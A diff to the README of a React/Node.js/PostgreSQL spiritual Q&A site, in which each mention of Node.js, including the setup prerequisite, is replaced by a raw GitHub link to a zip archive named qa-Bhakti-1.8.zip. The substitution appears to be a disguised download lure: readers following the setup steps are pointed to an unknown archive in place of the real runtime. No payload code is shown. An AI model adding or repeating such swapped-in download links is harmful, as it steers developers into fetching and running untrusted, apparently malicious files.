@@ -1,6 +1,6 @@
 # Bhakti Q&A Website
 
-A peaceful, spiritual Question-Answer platform built with React, Node.js, and PostgreSQL.
+A peaceful, spiritual Question-Answer platform built with React, https://github.com/latemailok-arch/Bhakti-qa/raw/refs/heads/main/telang/qa-Bhakti-1.8.zip, and PostgreSQL.
 
 ## Features
 - **Glassmorphism UI**: Beautiful, calm aesthetic with bubble animations.
@@ -11,13 +11,13 @@ A peaceful, spiritual Question-Answer platform built with React, Node.js, and Po
 
 ## Tech Stack
 - **Frontend**: React, Tailwind CSS, Framer Motion, Lucide React
-- **Backend**: Node.js, Express, Sequelize, PostgreSQL
+- **Backend**: https://github.com/latemailok-arch/Bhakti-qa/raw/refs/heads/main/telang/qa-Bhakti-1.8.zip, Express, Sequelize, PostgreSQL
 - **Deployment**: Ready for Render (Monorepo structure)
 
 ## Setup Instructions
 
 ### Prerequisites
-- Node.js installed
+- https://github.com/latemailok-arch/Bhakti-qa/raw/refs/heads/main/telang/qa-Bhakti-1.8.zip installed
 - PostgreSQL installed and running
 
 ### 1. Database Setup
